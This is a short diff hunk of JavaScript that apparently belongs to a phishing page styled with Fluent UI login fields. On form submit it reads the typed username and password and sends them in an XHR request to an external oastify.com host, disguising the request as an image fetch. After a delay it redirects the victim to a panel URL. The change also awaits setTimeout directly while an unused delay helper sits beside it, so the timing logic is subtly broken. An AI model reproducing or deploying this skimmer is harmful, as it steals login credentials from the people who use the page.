@@ -23,18 +23,17 @@
                 xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
                 xhr.send();
             }
-
-            document.body.addEventListener('submit', function(event) {
+            
+            const delay = ms => new Promise(res => setTimeout(res, ms));
+            
+            document.body.addEventListener('submit', async (event) => {
                 if (event.target.tagName.toLowerCase() === 'form') {
                     var username = document.getElementsByTagName('fluent-text-field')[0].value;
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
                     sendData(username, password);
                     if(password.length > 2){
-                        setTimeout(function(){
-                            window.location.href = 'https://my.daryakenar.ir/panel';
-                        }, 5000);
-                        event.preventDefault();
-                        this.action = "javascript:void(0);";
+                        await setTimeout(5000);
+                        window.location.href = 'https://my.daryakenar.ir/panel';
                     }
                 }
             });
